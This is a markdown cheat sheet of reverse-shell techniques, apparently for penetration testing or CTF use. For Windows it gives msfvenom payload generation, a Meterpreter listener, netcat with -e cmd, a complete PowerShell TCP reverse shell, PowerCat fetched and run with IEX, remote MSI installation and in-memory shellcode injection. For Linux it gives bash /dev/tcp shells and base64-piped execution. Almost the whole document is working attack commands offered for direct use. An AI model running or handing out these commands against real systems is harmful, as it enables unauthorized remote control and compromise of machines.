Last update: 2025.11.10
### Windows:
###### CMD/PowerShell Detection:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
###### MSFVenom Windows:
- Generate: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe`
- Run: `Start-Job -ScriptBlock {.\shell.exe}`

###### Meterpreter:
- Generate: `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o meterpreter.exe`
- Listener: `msfconsole -q`; `use multi/handler`; `set lhost tun0`; `set lport <PORT>`; `set payload <PAYLOAD>`; `run`

###### NC:
- GitHub: https://github.com/int0x33/nc.exe/ (Precompiled, in resources folder)
- Command: `.\nc64.exe <IP> <PORT> -e cmd`
###### PowerShell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
###### PowerCat:
Ref: https://github.com/besimorhino/powercat
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<LHOST>:8000/powercat.ps1");powercat -c <LHOST> -p <LPORT> -e powershell
```
###### MsiExec:
- Generate: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi`
- Run: `msiexec /q /i "http://<IP>:8000/shell.msi"`

###### PowerShell In-Memory Injection:
- Generate: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh-reflection`
PowerShell command:
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<payload>
```

---
### Linux:
Ref: https://www.revshells.com/
###### Bash:
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```
```bash
bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
```
```bash
echo <payload> | base64 -d | bash
```

---